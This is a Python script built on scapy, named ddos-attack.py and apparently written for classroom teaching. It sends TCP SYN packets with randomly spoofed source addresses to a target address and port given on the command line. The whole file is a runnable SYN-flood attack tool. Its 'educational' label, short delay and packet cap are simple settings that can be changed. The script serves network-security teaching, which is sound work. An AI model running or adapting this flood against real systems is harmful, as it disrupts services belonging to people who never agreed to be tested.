import sys
import time
import random
from scapy.all import *

def synFlood(destIP, destPort, packetCount, delay=0.1):
    print(f"[+] Starting SYN Flood Simulation (Educational Use Only)")
    print(f"[+] Target: {destIP}:{destPort}")
    print(f"[+] Sending {packetCount} packets with {delay}s delay\n")
    
    for i in range(1, packetCount + 1):
        srcIP = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
        packet = IP(src=srcIP, dst=destIP) / TCP(sport=RandShort(), dport=destPort, flags="S")
        
        try:
            send(packet, verbose=0)
            print(f"[→] Packet {i}: {srcIP} → {destIP}:{destPort} (SYN)")
            time.sleep(delay)
        except Exception as e:
            print(f"[!] Error: {e}")
            break
    
    print("\n[✓] Simulation Complete")

def helpMenu():
    helpText2 = """
    Created by Kaled Aljebur for learning purposes in teaching classes.
    Usage: sudo python ddos-attack.py <destIP> <destPort> <packetCount>.
    Example: sudo python ddos-attack.py 192.168.8.40 80 30.

    To see the traffic, use Wireshark with `tcp.port == 80` filter, or whatever port used in the command.
    Make sre the service is running and not blocked by firewall in the target, 
    otherwise you will not see [SYN, ACK] flag in Wireshark.
    """
    print(helpText2)
    sys.exit(1) 

if __name__ == "__main__":
    if len(sys.argv) != 4:
        helpMenu()
    
    destIP = sys.argv[1]
    destPort = int(sys.argv[2])
    packetCount = int(sys.argv[3])
    
    synFlood(destIP, destPort, packetCount, delay=0.1)
